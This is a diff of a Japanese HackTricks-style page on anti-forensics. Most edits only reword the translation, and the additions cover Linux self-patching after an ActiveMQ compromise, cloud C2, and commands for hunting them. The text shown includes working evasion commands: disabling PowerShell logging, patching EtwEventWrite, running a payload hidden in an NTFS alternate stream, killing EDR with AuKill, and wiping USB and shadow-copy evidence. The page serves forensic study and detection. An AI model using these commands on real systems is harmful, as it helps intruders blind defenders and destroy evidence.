@@ -4,7 +4,7 @@
 
 ## タイムスタンプ
 
-攻撃者は**ファイルのタイムスタンプを変更すること**に興味を持つかもしれません。\
+攻撃者は、**ファイルのタイムスタンプを変更すること**に興味を持つかもしれません。\
 タイムスタンプは、MFT内の属性`$STANDARD_INFORMATION` \_\_ と \_\_ `$FILE_NAME`に見つけることができます。
 
 両方の属性には4つのタイムスタンプがあります: **変更**, **アクセス**, **作成**, および **MFTレジストリ変更** (MACEまたはMACB)。
@@ -13,7 +13,7 @@
 
 ### TimeStomp - アンチフォレンジックツール
 
-このツールは**`$STANDARD_INFORMATION`**内のタイムスタンプ情報を**変更**しますが、**`$FILE_NAME`**内の情報は**変更しません**。したがって、**疑わしい** **活動を特定することが可能です**。
+このツールは、**`$STANDARD_INFORMATION`**内のタイムスタンプ情報を**変更**しますが、**`$FILE_NAME`**内の情報は**変更しません**。したがって、**疑わしい** **活動を特定することが可能です**。
 
 ### Usnjrnl
 
@@ -25,13 +25,13 @@
 
 ### $LogFile
 
-**ファイルシステムへのすべてのメタデータ変更は**、[書き込み先行ログ](https://en.wikipedia.org/wiki/Write-ahead_logging)として知られるプロセスで記録されます。記録されたメタデータは、NTFSファイルシステムのルートディレクトリにある`**$LogFile**`という名前のファイルに保持されます。[LogFileParser](https://github.com/jschicht/LogFileParser)のようなツールを使用して、このファイルを解析し、変更を特定できます。
+**ファイルシステムへのすべてのメタデータ変更は、**[write-ahead logging](https://en.wikipedia.org/wiki/Write-ahead_logging)として知られるプロセスでログに記録されます。ログに記録されたメタデータは、NTFSファイルシステムのルートディレクトリにある`**$LogFile**`という名前のファイルに保持されます。[LogFileParser](https://github.com/jschicht/LogFileParser)のようなツールを使用して、このファイルを解析し、変更を特定できます。
 
 ![](<../../images/image (137).png>)
 
 再び、ツールの出力では、**いくつかの変更が行われた**ことが確認できます。
 
-同じツールを使用して、**タイムスタンプが変更された時刻を特定する**ことも可能です：
+同じツールを使用して、**タイムスタンプが変更された時刻を特定することが可能です**：
 
 ![](<../../images/image (1089).png>)
 
@@ -64,12 +64,12 @@ slackerのようなツールを使用すると、この「隠された」スペ�
 
 ## UsbKill
 
-これは、USBポートに変更が検出された場合に**コンピュータをオフにする**ツールです。\
+これは、**USB**ポートに変更が検出された場合にコンピュータを**シャットダウンする**ツールです。\
 これを発見する方法は、実行中のプロセスを検査し、**実行中の各Pythonスクリプトをレビューする**ことです。
 
 ## ライブLinuxディストリビューション
 
-これらのディストロは**RAMメモリ内で実行されます**。検出する唯一の方法は、**NTFSファイルシステムが書き込み権限でマウントされている場合**です。読み取り権限のみでマウントされている場合、侵入を検出することはできません。
+これらのディストリビューションは**RAM**メモリ内で**実行されます**。検出する唯一の方法は、**NTFSファイルシステムが書き込み権限でマウントされている場合**です。読み取り権限のみでマウントされている場合、侵入を検出することはできません。
 
 ## セキュア削除
 
@@ -98,9 +98,9 @@ UserAssistを無効にするには、2つのステップが必要です：
 - 各々の値を1（または3）から0に変更するために修正を選択
 - 再起動
 
-### タイムスタンプの無効化 - 最終アクセス時刻
+### タイムスタンプの無効化 - 最終アクセス時間
 
-NTFSボリュームからフォルダーが開かれるたびに、システムは**各リストされたフォルダーのタイムスタンプフィールドを更新するための時間を取ります**。これは、NTFSボリュームが頻繁に使用される場合、パフォーマンスに影響を与える可能性があります。
+NTFSボリュームからフォルダーが開かれるたびに、システムは各リストされたフォルダーの**タイムスタンプフィールドを更新するための時間を取ります**。これは、最終アクセス時間と呼ばれます。NTFSボリュームが頻繁に使用される場合、これがパフォーマンスに影響を与える可能性があります。
 
 1. レジストリエディタを開く (Regedit.exe)。
 2. `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem`に移動します。
@@ -109,7 +109,7 @@ NTFSボリュームからフォルダーが開かれるたびに、システム�
 
 ### USB履歴の削除
 
-すべての**USBデバイスエントリ**は、USBデバイスをPCまたはノートパソコンに接続するたびに作成されるサブキーを含む**USBSTOR**レジストリキーの下にWindowsレジストリに保存されます。このキーはここにあります`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`。**これを削除することで**、USB履歴を削除します。\
+すべての**USBデバイスエントリ**は、PCまたはラップトップにUSBデバイスを接続するたびに作成されるサブキーを含む**USBSTOR**レジストリキーの下にWindowsレジストリに保存されます。このキーはここにあります`HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`。**これを削除することで**USB履歴を削除します。\
 また、[**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html)ツールを使用して、削除したことを確認することもできます（および削除するために）。
 
 USBに関する情報を保存する別のファイルは、`C:\Windows\INF`内の`setupapi.dev.log`ファイルです。これも削除する必要があります。
@@ -127,7 +127,7 @@ GUIを介して削除することも可能で、[https://www.ubackup.com/windows
 2. リストから「Volume Shadow Copy」を見つけて選択し、右クリックしてプロパティにアクセスします。
 3. 「スタートアップの種類」ドロップダウンメニューから「無効」を選択し、変更を適用してOKをクリックして確認します。
 
-シャドウコピーでコピーされるファイルの構成を変更することも可能で、レジストリ`HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot`で設定できます。
+シャドウコピーでコピーされるファイルの構成を変更することも可能で、レジストリ`HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot`で行います。
 
 ### 削除されたファイルの上書き
 
@@ -156,7 +156,7 @@ GUIを介して削除することも可能で、[https://www.ubackup.com/windows
 
 ### PowerShell ScriptBlock/Module Logging
 
-最近のWindows 10/11およびWindows Serverのバージョンは、`Microsoft-Windows-PowerShell/Operational` (イベント4104/4105/4106)の下に**リッチなPowerShellフォレンジックアーティファクト**を保持します。攻撃者は、これらをオンザフライで無効にしたり消去したりすることができます：
+最近のWindows 10/11およびWindows Serverのバージョンは、`Microsoft-Windows-PowerShell/Operational` (イベント4104/4105/4106)の下に**豊富なPowerShellフォレンジックアーティファクト**を保持します。攻撃者は、これらをオンザフライで無効にしたり消去したりすることができます：
 ```powershell
 # Turn OFF ScriptBlock & Module logging (registry persistence)
 New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
@@ -180,7 +180,7 @@ WriteProcessMemory(GetCurrentProcess(),
 GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
 patch, sizeof(patch), NULL);
 ```
-Public PoCs (e.g. `EtwTiSwallow`) は PowerShell または C++ で同じプリミティブを実装しています。  
+Public PoCs (e.g. `EtwTiSwallow`) は、PowerShell または C++ で同じプリミティブを実装しています。  
 パッチが **プロセスローカル** であるため、他のプロセス内で実行されている EDR はこれを見逃す可能性があります。  
 検出: メモリ内の `ntdll` とディスク上の `ntdll` を比較するか、ユーザーモードの前にフックします。
 
@@ -193,11 +193,11 @@ type cobalt.bin > report.pdf:win32res.dll
 rem Execute directly
 wmic process call create "cmd /c report.pdf:win32res.dll"
 ```
-ストリームを列挙するには、`dir /R`、`Get-Item -Stream *`、またはSysinternalsの`streams64.exe`を使用します。ホストファイルをFAT/exFATにコピーするか、SMB経由でコピーすると、隠しストリームが削除され、調査者がペイロードを回復するのに使用できます。
+ストリームを列挙するには、`dir /R`、`Get-Item -Stream *`、またはSysinternalsの`streams64.exe`を使用します。ホストファイルをFAT/exFATにコピーするか、SMB経由でコピーすると、隠しストリームが削除され、調査者がペイロードを回復するために使用できます。
 
 ### BYOVD & “AuKill” (2023)
 
-Bring-Your-Own-Vulnerable-Driverは、ランサムウェア侵入における**アンチフォレンジック**に現在一般的に使用されています。オープンソースツール**AuKill**は、署名されたが脆弱なドライバー（`procexp152.sys`）をロードして、暗号化およびログ破壊**の前に**EDRおよびフォレンジックセンサーを一時停止または終了させます。
+Bring-Your-Own-Vulnerable-Driverは、ランサムウェア侵入における**アンチフォレンジック**に日常的に使用されています。オープンソースツール**AuKill**は、署名されたが脆弱なドライバー（`procexp152.sys`）をロードして、暗号化およびログ破壊**の前に**EDRおよびフォレンジックセンサーを一時停止または終了させます。
 ```cmd
 AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
 AuKill.exe -k CrowdStrike
@@ -207,11 +207,88 @@ AuKill.exe -k CrowdStrike
 
 ---
 
-## 参考文献
+## Linuxアンチフォレンジックス：自己パッチとクラウドC2（2023–2025）
 
-- Sophos X-Ops – “AuKill: A Weaponized Vulnerable Driver for Disabling EDR” (2023年3月)  
+### 検出を減らすために妥協されたサービスを自己パッチする（Linux）  
+敵対者は、再利用を防ぎ、脆弱性に基づく検出を抑制するために、サービスを悪用した直後に「自己パッチ」を行うことが増えています。アイデアは、脆弱なコンポーネントを最新の正当なアップストリームバイナリ/JARに置き換えることで、スキャナーがホストをパッチ済みとして報告し、持続性とC2を維持することです。
+
+例：Apache ActiveMQ OpenWire RCE（CVE‑2023‑46604）  
+- ポストエクスプロイト後、攻撃者はMaven Central（repo1.maven.org）から正当なJARを取得し、ActiveMQインストール内の脆弱なJARを削除し、ブローカーを再起動しました。  
+- これにより、初期のRCEは閉じられましたが、他の足場（cron、SSH設定の変更、別のC2インプラント）は維持されました。
+
+運用例（例示的）
+```bash
+# ActiveMQ install root (adjust as needed)
+AMQ_DIR=/opt/activemq
+cd "$AMQ_DIR"/lib
+
+# Fetch patched JARs from Maven Central (versions as appropriate)
+curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-client/5.18.3/activemq-client-5.18.3.jar
+curl -fsSL -O https://repo1.maven.org/maven2/org/apache/activemq/activemq-openwire-legacy/5.18.3/activemq-openwire-legacy-5.18.3.jar
+
+# Remove vulnerable files and ensure the service uses the patched ones
+rm -f activemq-client-5.18.2.jar activemq-openwire-legacy-5.18.2.jar || true
+ln -sf activemq-client-5.18.3.jar activemq-client.jar
+ln -sf activemq-openwire-legacy-5.18.3.jar activemq-openwire-legacy.jar
+
+# Apply changes without removing persistence
+systemctl restart activemq || service activemq restart
+```
+Forensic/hunting tips
+- サービスディレクトリを確認して、スケジュールされていないバイナリ/JARの置き換えを探します：
+- Debian/Ubuntu: `dpkg -V activemq` を実行し、ファイルのハッシュ/パスをリポジトリミラーと比較します。
+- RHEL/CentOS: `rpm -Va 'activemq*'`
+- パッケージマネージャーに所有されていないディスク上のJARバージョンや、バンド外で更新されたシンボリックリンクを探します。
+- タイムライン: `find "$AMQ_DIR" -type f -printf '%TY-%Tm-%Td %TH:%TM %p\n' | sort` を使用して、ctime/mtimeを侵害ウィンドウと相関させます。
+- シェル履歴/プロセステレメトリ: 初期の悪用直後に `curl`/`wget` が `repo1.maven.org` や他のアーティファクトCDNに対しての証拠。
+- 変更管理: “パッチ”を適用したのは誰で、なぜ適用されたのかを検証し、パッチ版が存在するだけでは不十分です。
+
+### Cloud‑service C2 with bearer tokens and anti‑analysis stagers
+観察されたトレードクラフトは、複数の長距離C2パスとアンチ分析パッケージングを組み合わせていました：
+- サンドボックス化や静的分析を妨げるためのパスワード保護されたPyInstaller ELFローダー（例：暗号化されたPYZ、`/_MEI*`の下での一時的な抽出）。
+- インジケーター: `strings` ヒットの例として `PyInstaller`, `pyi-archive`, `PYZ-00.pyz`, `MEIPASS`。
+- ランタイムアーティファクト: `/tmp/_MEI*` への抽出またはカスタム `--runtime-tmpdir` パス。
+- ハードコーディングされたOAuthベアラートークンを使用したDropboxバックアップC2
+- ネットワークマーカー: `api.dropboxapi.com` / `content.dropboxapi.com` で `Authorization: Bearer <token>`。
+- 通常ファイルを同期しないサーバーワークロードからDropboxドメインへのアウトバウンドHTTPSを探すために、プロキシ/NetFlow/Zeek/Suricataでハントします。
+- トンネリングを介した並行/バックアップC2（例：Cloudflare Tunnel `cloudflared`）、1つのチャネルがブロックされた場合でも制御を保持します。
+- ホストIOC: `cloudflared` プロセス/ユニット、`~/.cloudflared/*.json` の設定、Cloudflareエッジへのアウトバウンド443。
+
+### Persistence and “hardening rollback” to maintain access (Linux examples)
+攻撃者は自己パッチと耐久性のあるアクセスパスを頻繁に組み合わせます：
+- Cron/Anacron: 各 `/etc/cron.*/` ディレクトリ内の `0anacron` スタブの編集による定期的な実行。
+- ハント:
+```bash
+for d in /etc/cron.*; do [ -f "$d/0anacron" ] && stat -c '%n %y %s' "$d/0anacron"; done
+grep -R --line-number -E 'curl|wget|python|/bin/sh' /etc/cron.*/* 2>/dev/null
+```
+- SSH設定のハードニングロールバック: ルートログインを有効にし、低特権アカウントのデフォルトシェルを変更します。
+- ルートログインの有効化をハント:
+```bash
+grep -E '^\s*PermitRootLogin' /etc/ssh/sshd_config
+# "yes" や過度に許可された設定のようなフラグ値
+```
+- システムアカウント（例：`games`）での疑わしいインタラクティブシェルをハント:
+```bash
+awk -F: '($7 ~ /bin\/(sh|bash|zsh)/ && $1 ~ /^(games|lp|sync|shutdown|halt|mail|operator)$/) {print}' /etc/passwd
+```
+- クラウドC2にも接続するランダムで短い名前のビーコンアーティファクト（8文字のアルファベット）をディスクにドロップ：
+- ハント:
+```bash
+find / -maxdepth 3 -type f -regextype posix-extended -regex '.*/[A-Za-z]{8}$' \
+-exec stat -c '%n %s %y' {} \; 2>/dev/null | sort
+```
+
+防御者は、これらのアーティファクトを外部露出およびサービスパッチイベントと相関させて、初期の悪用を隠すために使用されたアンチフォレンジック自己修復を明らかにする必要があります。
+
+## References
+
+- Sophos X-Ops – “AuKill: A Weaponized Vulnerable Driver for Disabling EDR” (March 2023)
 https://news.sophos.com/en-us/2023/03/07/aukill-a-weaponized-vulnerable-driver-for-disabling-edr
-- Red Canary – “Patching EtwEventWrite for Stealth: Detection & Hunting” (2024年6月)  
+- Red Canary – “Patching EtwEventWrite for Stealth: Detection & Hunting” (June 2024)
 https://redcanary.com/blog/etw-patching-detection
+
+- [Red Canary – Patching for persistence: How DripDropper Linux malware moves through the cloud](https://redcanary.com/blog/threat-intelligence/dripdropper-linux-malware/)
+- [CVE‑2023‑46604 – Apache ActiveMQ OpenWire RCE (NVD)](https://nvd.nist.gov/vuln/detail/CVE-2023-46604)
 
 {{#include ../../banners/hacktricks-training.md}}
